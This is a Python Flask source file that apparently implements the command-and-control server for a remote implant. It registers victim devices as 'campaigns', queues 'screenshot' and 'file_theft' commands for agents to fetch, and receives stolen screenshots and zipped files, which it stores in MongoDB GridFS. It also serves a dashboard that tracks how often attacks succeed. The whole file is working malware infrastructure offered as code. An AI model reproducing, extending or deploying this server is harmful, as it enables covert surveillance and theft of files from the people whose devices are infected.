from flask import Flask, request, jsonify, render_template, send_file
from pymongo import MongoClient, errors
from dotenv import load_dotenv
from bson.objectid import ObjectId
from gridfs import GridFS
from datetime import datetime, timedelta
import os
import re
import json
import base64
import io
import zipfile

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# MongoDB Configuration
MONGO_URI = os.getenv('MONGO_URI')

# Initialize MongoDB client and GridFS
client = MongoClient(MONGO_URI)
db = client.get_database()
fs = GridFS(db)

def initialize_db():
    try:
        # Check the connection
        client.admin.command('ping')

        # Initialize collections
        initialize_collection(db, 'campaigns')
        initialize_collection(db, 'last_activity')
        # Note: command_queue collection is not created here because it's created dynamically per client

        return client, db, db['campaigns'], db['artifacts'], db['last_activity']
    except errors.ServerSelectionTimeoutError as err:
        print(f'Failed to connect to MongoDB: {err}')
        return None, None, None, None, None

def initialize_collection(db, collection_name):
    if collection_name not in db.list_collection_names():
        print(f'Collection "{collection_name}" does not exist. Creating collection and inserting initial schema.')
        
        if collection_name == 'campaigns':
            sample_campaigns = [
                {
                    'client_id': 'client123',
                    'device_name': 'Device A',
                    'last_activity_date': datetime.now(),
                    'status': 'active'
                },
                {
                    'client_id': 'client123',
                    'device_name': 'Device B',
                    'last_activity_date': datetime.now(),
                    'status': 'inactive'
                }
            ]
            db[collection_name].insert_many(sample_campaigns)

client, db, campaign_collection, artifact_collection, last_activity_collection = initialize_db()

# Registration
@app.route('/registration/', methods=['POST'])
def registration():
    data = request.json
    client_id = data.get('client_id')

    if client_id:
        existing_client = campaign_collection.find_one({'client_id': client_id})

        if existing_client:
            if existing_client['status'] == 'active':
                return jsonify({'status': 0, 'message': 'Client is already active'}), 200
            elif existing_client['status'] == 'inactive':
                campaign_collection.update_one(
                    {'client_id': client_id},
                    {'$set': {'status': 'active', 'registered_at': datetime.now()}}
                )
                return jsonify({'status': 0, 'message': 'Client status updated to active'}), 200
        else:
            device_count = campaign_collection.count_documents({})
            next_device_letter = chr(ord('A') + device_count)
            device_name = f"Device {next_device_letter}"

            db.create_collection(f'artifacts_{device_name}')
            db.create_collection(f'command_queue_{device_name}')

            campaign_collection.update_one(
                {'client_id': client_id},
                {
                    '$set': {
                        'client_id': client_id,
                        'device_name': device_name,
                        'registered_at': datetime.now(),
                        'status': 'active'
                    }
                },
                upsert=True
            )
            return jsonify({'status': 0, 'message': f'{device_name} registered and collections created'}), 201
    else:
        return jsonify({'status': 1, 'message': 'ClientID not provided'}), 400

# Keep alive
@app.route('/<client_id>/keepalive/', methods=['POST'])
def keep_alive(client_id):
    campaign_collection.update_one(
        {'client_id': client_id},
        {'$set': {'last_activity': datetime.now()}}
    )
    return jsonify({'status': 'alive'}), 200

#Get artifacts
@app.route('/receive_artifact', methods=['POST'])
def receive_artifact():
    data = request.json
    activity_id = data.get('activity_id')
    client_id = data.get('client_id')
    last_activity = last_activity_collection.find_one({'_id': ObjectId(activity_id)})

    if not last_activity:
        return jsonify({'status': 'error', 'message': 'Activity ID not found'}), 404

    action_type = last_activity.get('action_type')
    device_name = last_activity.get('device')
    artifact_collection_name = f'artifacts_{device_name}'
    artifact_collection = db[artifact_collection_name]

    responses = []
    status_update = 'success'

    if action_type == 'screenshot':
        screenshot_base64 = data.get('screenshot')
        if screenshot_base64 is None:
            status_update = 'failure'
            return jsonify({'status': 'error', 'message': 'The screenshot key is not found in the JSON file.'}), 400
        
        # Get the latest screenshot file number
        try:
            existing_files = fs.find({'filename': {'$regex': f'^{action_type}_(\\d+).png$'}})
            latest_number = 0
            for file in existing_files:
                match = re.match(f'^{action_type}_(\\d+).png$', file.filename)
                if match:
                    number = int(match.group(1))
                    if number > latest_number:
                        latest_number = number
            new_number = latest_number + 1
            file_name = f"{action_type}_{new_number}.png"
            
            # Decode the base64 string
            screenshot_data = base64.b64decode(screenshot_base64)
            
            # Save the screenshot to GridFS
            fs.put(io.BytesIO(screenshot_data), filename=file_name)
            
            # Insert artifact data into the collection
            artifact_data = {
                'client_id': client_id,
                'device': device_name,
                'artifact_type': action_type,
                'file_name': file_name,
                'content': screenshot_base64,
                'created_at': datetime.now()
            }
            artifact_collection.insert_one(artifact_data)
            responses.append({'file_name': file_name, 'status': 'saved'})
        
        except Exception as e:
            status_update = 'failure'
            return jsonify({'status': 'error', 'message': f'Failed to insert artifact into database: {str(e)}'}), 500

    elif action_type == 'file_theft':
        zip_base64 = data.get('key')
        if zip_base64 is None:
            status_update = 'failure'
            return jsonify({'status': 'error', 'message': 'The zip_file key is not found in the JSON file.'}), 400
        
        # Decode the base64 string
        try:
            zip_data = base64.b64decode(zip_base64)
            
            # Open the zip file
            with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zip_file:
                for file_info in zip_file.infolist():
                    file_name = file_info.filename
                    file_data = zip_file.read(file_info)
                    
                    # Save the file to GridFS
                    fs.put(io.BytesIO(file_data), filename=file_name)
                    
                    # Insert artifact data into the collection
                    artifact_data = {
                        'client_id': client_id,
                        'device': device_name,
                        'artifact_type': action_type,
                        'file_name': file_name,
                        'content': base64.b64encode(file_data).decode('utf-8'),
                        'created_at': datetime.now()
                    }
                    artifact_collection.insert_one(artifact_data)
                    responses.append({'file_name': file_name, 'status': 'saved'})
        
        except Exception as e:
            status_update = 'failure'
            return jsonify({'status': 'error', 'message': f'Failed to process zip file: {str(e)}'}), 500

    # Update the status of the last activity
    last_activity_collection.update_one(
        {'_id': ObjectId(activity_id)},
        {'$set': {'status': status_update}}
    )

    return jsonify({'status': 'success', 'responses': responses})

#add command to the Q
@app.route('/<client_name>/add_command/', methods=['POST'])
def add_command(client_name):
    data = request.json
    command = data.get('Cmd')
    if not command:
        return jsonify({'status': 'error', 'message': 'Command not provided'}), 400

    queue_collection_name = f'command_queue_{client_name}'
    activity_id = str(ObjectId())

    if command == 'screenshot':
        command_data = json.dumps({'cmd': 'screenshot'})
    elif command == 'file_theft':
        tasks = data.get('tasks', {})
        command_data = json.dumps(tasks)
    else:
        return jsonify({'status': 'error', 'message': 'Unknown command'}), 400

    try:
        db[queue_collection_name].insert_one({
            '_id': activity_id,
            'command': command,
            'timestamp': datetime.now(),
            'json': command_data
        })

        last_activity_data = {
            '_id': activity_id,
            'device': client_name,
            'date': datetime.now(),
            'action_type': command,
            'status': 'in progress'
        }
        last_activity_collection.insert_one(last_activity_data)
        return jsonify({'status': 'success', 'message': 'Command added to queue'}), 201
    except Exception as e:
        print(f'Error adding command to queue: {e}')
        return jsonify({'status': 'error', 'message': 'Failed to add command to queue'}), 500
    
#send command to the Agent 
@app.route('/<client_id>/send_command/', methods=['POST'])
def send_command(client_id):
    existing_client = campaign_collection.find_one({'client_id': client_id})
    if not existing_client:
        return jsonify({'status': 'error', 'message': 'Client not found'}), 404
    
    device_name = existing_client.get('device_name')
    queue_collection_name = f'command_queue_{device_name}'

    command_doc = db[queue_collection_name].find_one_and_delete({}, sort=[('timestamp', 1)])

    if command_doc:
        command = command_doc.get('command')
        activity_id = command_doc.get('_id')
        command_data = command_doc.get('json')

        response = {
            'response': f'Command {command} sent to device {client_id}.',
            'command': command,
            'activity_id': activity_id,
            'command_data': command_data
        }
        return jsonify(response), 200
    else:
        return jsonify({'status': 'error', 'message': 'No commands in queue'}), 404
    
#server(front) API 
# Login
VALID_USERNAME = os.getenv('VALID_USERNAME')
VALID_PASSWORD = os.getenv('VALID_PASSWORD')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if username == VALID_USERNAME and password == VALID_PASSWORD:
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'failure'}), 401

# Routes
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    active_campaigns_count = campaign_collection.count_documents({"status": "active"})
    total_campaigns_count = campaign_collection.count_documents({})

    return render_template('Dashboard.html',
                           active_campaigns=active_campaigns_count,
                           total_campaigns=total_campaigns_count)

@app.route('/api/dashboard-data')
def api_dashboard_data():
    success_count = last_activity_collection.count_documents({"status": "success"})
    failure_count = last_activity_collection.count_documents({"status": "failure"})
    inprogress_count = last_activity_collection.count_documents({"status": "in progress"})
    
    data = {
        'success': success_count,
        'failure': failure_count,
        'inprogress': inprogress_count
    }
    return jsonify(data)

@app.route('/api/top-actions')
def top_actions():
    pipeline = [
        {"$group": {"_id": "$action_type", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 3}
    ]
    
    top_actions = list(last_activity_collection.aggregate(pipeline))
    
    data = {
        'actions': [action['_id'] for action in top_actions],
        'counts': [action['count'] for action in top_actions]
    }
    
    return jsonify(data)

@app.route('/api/last-activity', methods=['GET'])
def last_activity():
    try:
        ten_days_ago = datetime.now() - timedelta(days=10)
        activities = list(last_activity_collection.find(
            {'date': {'$gte': ten_days_ago}}
        ).sort("date", 1)) 

        date_hour_counts = {}
        action_types = {}
        
        for activity in activities:
            date_str = activity['date'].strftime('%Y-%m-%d')
            hour = activity['date'].hour 
            action_type = activity.get('action_type', 'Unknown Action')  

            if date_str not in date_hour_counts:
                date_hour_counts[date_str] = [0] * 24 
                action_types[date_str] = [''] * 24 
            
            date_hour_counts[date_str][hour] += 1
            action_types[date_str][hour] = action_type  

        data = {
            'dates': [],
            'hours': [],
            'action_types': []
        }

        for date, hours in date_hour_counts.items():
            data['dates'].append(date)
            data['hours'].append(hours)
            data['action_types'].append(action_types[date]) 

        return jsonify(data)
    except Exception as e:
        print(f'Error retrieving last activity data: {e}')
        return jsonify({'error': 'Failed to retrieve data'}), 500

@app.route('/info')
def info():
    return render_template('Info.html')

@app.route('/login')
def BackToLogin():
    return render_template('Login.html')

@app.route('/management')
def Management():
    campaigns = list(campaign_collection.find().sort("registered_at", -1))
    return render_template('Management.html', campaigns=campaigns)

@app.route('/lastActivity')
def table():
    last_activities = list(last_activity_collection.find().sort("date", -1))
    return render_template('Last-Activity.html', last_activities=last_activities)

@app.route('/campaigns')
def Campaigns():
    devices = campaign_collection.find({"status": "active"}, {"_id": 0, "device_name": 1}) 
    device_list = [device['device_name'] for device in devices]
    return render_template('campaigns.html', devices=device_list)

# Generate Report
@app.route('/report', methods=['GET'])
def report():
    try:
        active_connections_count = campaign_collection.count_documents({"status": "active"})
        total_connections_count = campaign_collection.count_documents({})
        
        total_activities_count = last_activity_collection.count_documents({})
        success_count = last_activity_collection.count_documents({"status": "success"})
        failure_count = last_activity_collection.count_documents({"status": "failure"})
        
        success_percentage = (success_count / total_activities_count * 100) if total_activities_count > 0 else 0
        failure_percentage = (failure_count / total_activities_count * 100) if total_activities_count > 0 else 0
        
        pipeline = [
            {"$group": {"_id": "$action_type", "count": {"$sum": 1}}},
            {"$sort": {"count": -1}},
            {"$limit": 3}
        ]
        top_actions = list(last_activity_collection.aggregate(pipeline))
        top_actions_data = {
            'actions': [action['_id'] for action in top_actions],
            'counts': [action['count'] for action in top_actions]
        }
        
        ten_days_ago = datetime.now() - timedelta(days=10)
        activities = list(last_activity_collection.find(
            {'date': {'$gte': ten_days_ago}}
        ).sort("date", 1))
        
        date_counts = {}
        for activity in activities:
            date_str = activity['date'].strftime('%Y-%m-%d')
            if date_str not in date_counts:
                date_counts[date_str] = 0
            date_counts[date_str] += 1
        
        max_date = max(date_counts, key=date_counts.get, default=None)
        
        report_data = {
            'active_connections': active_connections_count,
            'total_connections': total_connections_count,
            'success_count': success_count,
            'failure_count': failure_count,
            'success_percentage': success_percentage,
            'failure_percentage': failure_percentage,
            'top_actions': top_actions_data,
            'highest_activity_date': max_date
        }
        
        json_data = json.dumps(report_data, indent=4)
        
        buffer = io.BytesIO()
        buffer.write(json_data.encode('utf-8'))
        buffer.seek(0)
        
        return send_file(
            buffer,
            as_attachment=True,
            download_name='report.json',
            mimetype='application/json'
        )
    except Exception as e:
        print(f'Error generating report: {e}')
        return jsonify({'error': 'Failed to generate report'}), 500

@app.route('/delete_campaign/<client_id>', methods=['DELETE'])
def delete_campaign(client_id):
    result = campaign_collection.delete_one({'client_id': client_id})
    if result.deleted_count > 0:
        return jsonify({'status': 'success', 'message': 'Campaign deleted'})
    else:
        return jsonify({'status': 'failure', 'message': 'Campaign not found'}), 404

# Run server
if __name__ == '__main__':
    app.run(debug=True, port=1234)
